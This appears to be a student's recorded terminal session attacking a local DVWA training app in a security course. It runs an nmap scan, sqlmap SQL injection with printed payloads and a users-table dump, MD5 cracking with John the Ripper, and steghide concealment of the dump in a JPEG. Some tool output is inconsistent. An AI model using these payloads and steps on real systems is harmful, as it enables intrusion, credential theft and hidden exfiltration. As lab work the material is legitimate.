@@ -1,0 +1,198 @@
+Script started on 2026-10-02 18:24:35+01:00 [TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="92" LINES="26"]
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004hddate[?1l>[?2004l
+Fri Oct  2 06:24:41 PM WAT 2026
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004hwwhoami[?1l>[?2004l
+abasiono
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004hhhostname[?1l>[?2004l
+abasiono
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004hnnmap -sV -p 80,3306, 8080 127.0.01 .1[?1l>[?2004l
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-02 18:27 +0100
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000035s latency).
+
+PORT     STATE  SERVICE VERSION
+80/tcp   closed http
+3306/tcp closed mysql
+8080/tcp open   http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7mcurl -s "http://127.0.0.1:8080/dvwa/vulnerabilities/sqli/?[7mi[7md=1&Submit=Submit"[27m[K[A[15C[27mc[27mu[27mr[27ml[27m [27m-[27ms[27m [27m"[27mh[27mt[27mt[27mp[27m:[27m/[27m/[27m1[27m2[27m7[27m.[27m0[27m.[27m0[27m.[27m1[27m:[27m8[27m0[27m8[27m0[27m/[27md[27mv[27mw[27ma[27m/[27mv[27mu[27ml[27mn[27me[27mr[27ma[27mb[27mi[27ml[27mi[27mt[27mi[27me[27ms[27m/[27ms[27mq[27ml[27mi[27m/[27m?i[27md[27m=[27m1[27m&[27mS[27mu[27mb[27mm[27mi[27mt[27m=[27mS[27mu[27mb[27mm[27mi[27mt[27m"[?1l>[?2004l
+<!DOCTYPE html>
+<html><head><title>DVWA - SQL Injection</title></head>
+<body bgcolor="#ffffff">
+<div align="center"><h1>Damn Vulnerable Web Application</h1>
+<h2>SQL Injection</h2></div>
+<hr>
+<p>Enter an ID to look up:</p>
+<form action="#" method="GET">
+<input type="text" size="15" name="id" value="1">
+<input type="submit" name="Submit" value="Submit">
+</form>
+<hr>
+<pre>ID: 1
+First name: admin
+Surname: admin</pre>
+</body></html>
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7msqlmap -u "http://127.0.0.1:8080/dvwa/vulnerabilities/sqli[7m/[7m?id=1&Submit=Submit" --batch --technique=BETU --threads=2[27m[K[A[24D[27ms[27mq[27ml[27mm[27ma[27mp[27m [27m-[27mu[27m [27m"[27mh[27mt[27mt[27mp[27m:[27m/[27m/[27m1[27m2[27m7[27m.[27m0[27m.[27m0[27m.[27m1[27m:[27m8[27m0[27m8[27m0[27m/[27md[27mv[27mw[27ma[27m/[27mv[27mu[27ml[27mn[27me[27mr[27ma[27mb[27mi[27ml[27mi[27mt[27mi[27me[27ms[27m/[27ms[27mq[27ml[27mi/[27m?[27mi[27md[27m=[27m1[27m&[27mS[27mu[27mb[27mm[27mi[27mt[27m=[27mS[27mu[27mb[27mm[27mi[27mt[27m"[27m [27m-[27m-[27mb[27ma[27mt[27mc[27mh[27m [27m-[27m-[27mt[27me[27mc[27mh[27mn[27mi[27mq[27mu[27me[27m=[27mB[27mE[27mT[27mU[27m [27m-[27m-[27mt[27mh[27mr[27me[27ma[27md[27ms[27m=[27m2[?1l>[?2004l
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;34m1.10.9#pip[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttps://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:29:49 /2026-10-02/
+
+[[36m18:29:49[0m] [[32mINFO[0m] resuming back-end DBMS '[37msqlite[0m' 
+[[36m18:29:49[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 1581=1581 AND 'xiRo'='xiRo&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CHAR(113,112,98,112,113)||CHAR(107,120,85,78,110,78,71,107,87,104,65,111,75,65,83,75,65,67,89,76,84,72,76,68,99,104,80,79,88,113,115,90,112,90,81,66,75,110,85,122)||CHAR(113,122,120,118,113),NULL-- vApv&Submit=Submit
+---
+[[36m18:29:49[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is SQLite[0m
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8
+back-end DBMS: SQLite
+[[36m18:29:49[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/abasiono/.local/share/sqlmap/output/127.0.0.1[0m'
+
+[*] ending @ 18:29:49 /2026-10-02/
+
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7msqlmap -u "http://127.0.0.1:8080/dvwa/vulnerabilities/sqli[7m/[7m?id=1&Submit=Submit" --batch -T users --dump[27m[K[A[11D[27ms[27mq[27ml[27mm[27ma[27mp[27m [27m-[27mu[27m [27m"[27mh[27mt[27mt[27mp[27m:[27m/[27m/[27m1[27m2[27m7[27m.[27m0[27m.[27m0[27m.[27m1[27m:[27m8[27m0[27m8[27m0[27m/[27md[27mv[27mw[27ma[27m/[27mv[27mu[27ml[27mn[27me[27mr[27ma[27mb[27mi[27ml[27mi[27mt[27mi[27me[27ms[27m/[27ms[27mq[27ml[27mi/[27m?[27mi[27md[27m=[27m1[27m&[27mS[27mu[27mb[27mm[27mi[27mt[27m=[27mS[27mu[27mb[27mm[27mi[27mt[27m"[27m [27m-[27m-[27mb[27ma[27mt[27mc[27mh[27m [27m-[27mT[27m [27mu[27ms[27me[27mr[27ms[27m [27m-[27m-[27md[27mu[27mm[27mp[?1l>[?2004l
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;34m1.10.9#pip[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttps://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:33:13 /2026-10-02/
+
+[[36m18:33:13[0m] [[32mINFO[0m] resuming back-end DBMS '[37msqlite[0m' 
+[[36m18:33:13[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 1581=1581 AND 'xiRo'='xiRo&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CHAR(113,112,98,112,113)||CHAR(107,120,85,78,110,78,71,107,87,104,65,111,75,65,83,75,65,67,89,76,84,72,76,68,99,104,80,79,88,113,115,90,112,90,81,66,75,110,85,122)||CHAR(113,122,120,118,113),NULL-- vApv&Submit=Submit
+---
+[[36m18:33:13[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is SQLite[0m
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8
+back-end DBMS: SQLite
+[[36m18:33:13[0m] [[32mINFO[0m] fetching columns for table '[37musers[0m' 
+[[36m18:33:13[0m] [[32mINFO[0m] fetching entries for table '[37musers[0m'
+[[36m18:33:13[0m] [[32mINFO[0m] recognized possible password hashes in column '[37mpassword[0m'
+[1mdo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+[0m[1mdo you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[0m[[36m18:33:13[0m] [[32mINFO[0m] using hash method '[37mmd5_generic_passwd[0m'
+[1mwhat dictionary do you want to use?
+[1] default dictionary file '/home/abasiono/.local/share/pipx/venvs/sqlmap/lib/python3.14/site-packages/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[0m[[36m18:33:13[0m] [[32mINFO[0m] using default dictionary
+[1mdo you want to use common password suffixes? (slow!) [y/N] N
+[0m[[36m18:33:13[0m] [[32mINFO[0m] starting dictionary-based cracking (md5_generic_passwd)
+[[36m18:33:13[0m] [[32mINFO[0m] starting 4 processes 
+Traceback (most recent call last):
+  File [35m"<string>"[0m, line [35m1[0m, in [35m<module>[0m
+    import sys; from multiprocessing.forkserver import main; [31mmain[0m[1;31m(16, 17, ['__main__'], sys_argv=sys.argv[1:], **{'sys_path': ['/home/abasiono/.local/share/pipx/venvs/sqlmap/lib/python3.14/site-packages/sqlmap', '/home/abasiono/.local/share/pipx/venvs/sqlmap/bin', '/usr/lib/python314.zip', '/usr/lib/python3.14', '/usr/lib/python3.14/lib-dynload', '/home/abasiono/.local/share/pipx/venvs/sqlmap/lib/python3.14/site-packages', '/home/abasiono/.local/share/pipx/shared/lib/python3.14/site-packages'], 'main_path': '/home/abasiono/.local/bin/sqlmap', 'authkey_r': 19})[0m
+                                                             [31m~~~~[0m[1;31m^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^[0m
+  File [35m"/usr/lib/python3.14/multiprocessing/forkserver.py"[0m, line [35m230[0m, in [35mmain[0m
+    [31mspawn.import_main_path[0m[1;31m(main_path)[0m
+    [31m~~~~~~~~~~~~~~~~~~~~~~[0m[1;31m^^^^^^^^^^^[0m
+  File [35m"/usr/lib/python3.14/multiprocessing/spawn.py"[0m, line [35m307[0m, in [35mimport_main_path[0m
+    [31m_fixup_main_from_path[0m[1;31m(main_path)[0m
+    [31m~~~~~~~~~~~~~~~~~~~~~[0m[1;31m^^^^^^^^^^^[0m
+  File [35m"/usr/lib/python3.14/multiprocessing/spawn.py"[0m, line [35m297[0m, in [35m_fixup_main_from_path[0m
+    main_content = runpy.run_path(main_path,
+                                  run_name="__mp_main__")
+  File [35m"<frozen runpy>"[0m, line [35m287[0m, in [35mrun_path[0m
+  File [35m"<frozen runpy>"[0m, line [35m98[0m, in [35m_run_module_code[0m
+  File [35m"<frozen runpy>"[0m, line [35m88[0m, in [35m_run_code[0m
+  File [35m"/home/abasiono/.local/bin/sqlmap"[0m, line [35m3[0m, in [35m<module>[0m
+    from sqlmap.sqlmap import main
+[1;35mModuleNotFoundError[0m: [35mNo module named 'sqlmap.sqlmap'; 'sqlmap' is not a package[0m
+[[36m18:33:13[0m] [[41;37mCRITICAL[0m] an error occurred while attacking table dump ('[37mConnectionResetError: Connection reset by peer[0m')
+Database: <current>
+Table: users
+[5 entries]
++---------+----------------------------------+-----------+------------+
+| user_id | password                         | last_name | first_name |
++---------+----------------------------------+-----------+------------+
+| 1       | 21232f297a57a5a743894a0e4a801fc3 | admin     | admin      |
+| 2       | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
+| 3       | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
+| 4       | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
+| 5       | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
++---------+----------------------------------+-----------+------------+
+
+[[36m18:33:13[0m] [[32mINFO[0m] table '[37mSQLite_masterdb.users[0m' dumped to CSV file '[37m/home/abasiono/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/users.csv[0m'
+[[36m18:33:13[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/abasiono/.local/share/sqlmap/output/127.0.0.1[0m'
+
+[*] ending @ 18:33:13 /2026-10-02/
+
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7mjohn --format=raw-md5 --wordlist=$HOME/.local/cyb201-tools[7m/[7mshare/wordlists/rockyou.txt hash.txt[27m[K[A[27mj[27mo[27mh[27mn[27m [27m-[27m-[27mf[27mo[27mr[27mm[27ma[27mt[27m=[27mr[27ma[27mw[27m-[27mm[27md[27m5[27m [27m-[27m-[27mw[27mo[27mr[27md[27ml[27mi[27ms[27mt[27m=[27m$[27mH[27mO[27mM[27mE[27m/[27m.[27ml[27mo[27mc[27ma[27ml[27m/[27mc[27my[27mb[27m2[27m0[27m1[27m-[27mt[27mo[27mo[27ml[27ms/[27ms[27mh[27ma[27mr[27me[27m/[27mw[27mo[27mr[27md[27ml[27mi[27ms[27mt[27ms[27m/[27mr[27mo[27mc[27mk[27my[27mo[27mu[27m.[27mt[27mx[27mt[27m [27mh[27ma[27ms[27mh[27m.[27mt[27mx[27mt[?1l>[?2004l
+stat: hash.txt: No such file or directory
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7m~/.local/bin/john --show --format=raw-md5 ~/hash.txt[27m[52D[27m~[27m/[27m.[27ml[27mo[27mc[27ma[27ml[27m/[27mb[27mi[27mn[27m/[27mj[27mo[27mh[27mn[27m [27m-[27m-[27ms[27mh[27mo[27mw[27m [27m-[27m-[27mf[27mo[27mr[27mm[27ma[27mt[27m=[27mr[27ma[27mw[27m-[27mm[27md[27m5[27m [27m~[27m/[27mh[27ma[27ms[27mh[27m.[27mt[27mx[27mt[?1l>[?2004l
+admin:admin
+smithy:password
+
+2 password hashes cracked, 3 left
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7mjohn --format=raw-md5 --wordlist=$HOME/.local/cyb201-tools[7m/[7mshare/wordlists/rockyou.txt ~/hash.txt[27m[K[A[27mj[27mo[27mh[27mn[27m [27m-[27m-[27mf[27mo[27mr[27mm[27ma[27mt[27m=[27mr[27ma[27mw[27m-[27mm[27md[27m5[27m [27m-[27m-[27mw[27mo[27mr[27md[27ml[27mi[27ms[27mt[27m=[27m$[27mH[27mO[27mM[27mE[27m/[27m.[27ml[27mo[27mc[27ma[27ml[27m/[27mc[27my[27mb[27m2[27m0[27m1[27m-[27mt[27mo[27mo[27ml[27ms/[27ms[27mh[27ma[27mr[27me[27m/[27mw[27mo[27mr[27md[27ml[27mi[27ms[27mt[27ms[27m/[27mr[27mo[27mc[27mk[27my[27mo[27mu[27m.[27mt[27mx[27mt[27m [27m~[27m/[27mh[27ma[27ms[27mh[27m.[27mt[27mx[27mt[?1l>[?2004l
+Using default input encoding: UTF-8
+Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Cracked 2 password hashes (are in /home/abasiono/.john/john.pot), use "--show"
+Remaining 3 password hashes with no different salts
+Warning: no OpenMP support for this hash type, consider --fork=4
+Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+[0;33mabc123[0m           ([0;33mgordonb[0m[0m)     
+[0;33mletmein[0m          ([0;33mpablo[0m[0m)     
+[0;33mcharley[0m          ([0;33m1337[0m[0m)     
+3g 0:00:00:00 DONE (2026-10-02 19:16) 15.79g/s 16168p/s 16168c/s 22231C/s my3kids..dangerous
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7mjohn --format=raw-md5 --wordlist=$HOME/.local/cyb201-tools[7m/[7mshare/wordlists/rockyou.txt ~/hash.txt[27m[K[A[K[1B[K[A[34C[7mjohn --show --format=raw-md5 ~/hash.txt[27m[39D[27mj[27mo[27mh[27mn[27m [27m-[27m-[27ms[27mh[27mo[27mw[27m [27m-[27m-[27mf[27mo[27mr[27mm[27ma[27mt[27m=[27mr[27ma[27mw[27m-[27mm[27md[27m5[27m [27m~[27m/[27mh[27ma[27ms[27mh[27m.[27mt[27mx[27mt[?1l>[?2004l[1Badmin:admin
+gordonb:abc123
+1337:charley
+pablo:letmein
+smithy:password
+
+5 password hashes cracked, 0 left
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/code/school/cyb-201[39m [32m[39m $ [K[?1h=[?2004h[7mcd ~/cyb201-evidence[27m
+[7msteghide embed -cf cover.jpg -ef dump.csv -p "cyb201" -sf stego_output.jpg[27m[K
+[7msteghide info stego_output.jpg -p "cyb201"[27m[K
+[7msteghide extract -sf stego_output.jpg -p "cyb201" -xf recovered.csv[27m[K
+[7mcmp dump.csv recovered.csv && echo ROUND-TRIP OK[27m[K[4A[14D[27mc[27md[27m [27m~[27m/[27mc[27my[27mb[27m2[27m0[27m1[27m-[27me[27mv[27mi[27md[27me[27mn[27mc[27me[1B[27ms[27mt[27me[27mg[27mh[27mi[27md[27me[27m [27me[27mm[27mb[27me[27md[27m [27m-[27mc[27mf[27m [27mc[27mo[27mv[27me[27mr[27m.[27mj[27mp[27mg[27m [27m-[27me[27mf[27m [27md[27mu[27mm[27mp[27m.[27mc[27ms[27mv[27m [27m-[27mp[27m [27m"[27mc[27my[27mb[27m2[27m0[27m1[27m"[27m [27m-[27ms[27mf[27m [27ms[27mt[27me[27mg[27mo[27m_[27mo[27mu[27mt[27mp[27mu[27mt[27m.[27mj[27mp[27mg[1B[27ms[27mt[27me[27mg[27mh[27mi[27md[27me[27m [27mi[27mn[27mf[27mo[27m [27ms[27mt[27me[27mg[27mo[27m_[27mo[27mu[27mt[27mp[27mu[27mt[27m.[27mj[27mp[27mg[27m [27m-[27mp[27m [27m"[27mc[27my[27mb[27m2[27m0[27m1[27m"[1B[27ms[27mt[27me[27mg[27mh[27mi[27md[27me[27m [27me[27mx[27mt[27mr[27ma[27mc[27mt[27m [27m-[27ms[27mf[27m [27ms[27mt[27me[27mg[27mo[27m_[27mo[27mu[27mt[27mp[27mu[27mt[27m.[27mj[27mp[27mg[27m [27m-[27mp[27m [27m"[27mc[27my[27mb[27m2[27m0[27m1[27m"[27m [27m-[27mx[27mf[27m [27mr[27me[27mc[27mo[27mv[27me[27mr[27me[27md[27m.[27mc[27ms[27mv[1B[27mc[27mm[27mp[27m [27md[27mu[27mm[27mp[27m.[27mc[27ms[27mv[27m [27mr[27me[27mc[27mo[27mv[27me[27mr[27me[27md[27m.[27mc[27ms[27mv[27m [27m&[27m&[27m [27me[27mc[27mh[27mo[27m [27mR[27mO[27mU[27mN[27mD[27m-[27mT[27mR[27mI[27mP[27m [27mO[27mK[?1l>[?2004l
+embedding "dump.csv" in "cover.jpg"... 0.2%embedding "dump.csv" in "cover.jpg"... done
+writing stego file "stego_output.jpg"... done
+"stego_output.jpg":
+  format: jpeg
+  capacity: 267.3 KB
+  embedded file "dump.csv":
+    size: 270.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+wrote extracted data to "recovered.csv".
+ROUND-TRIP OK
+[1m[7m%[27m[1m[0m                                                                                            [0m[27m[24m[Jabasiono [36m~/cyb201-evidence[39m [32m[39m $ [K[?1h=[?2004heexit[?1l>[?2004l
+
+Script done on 2026-10-02 19:34:50+01:00 [COMMAND_EXIT_CODE="0"]
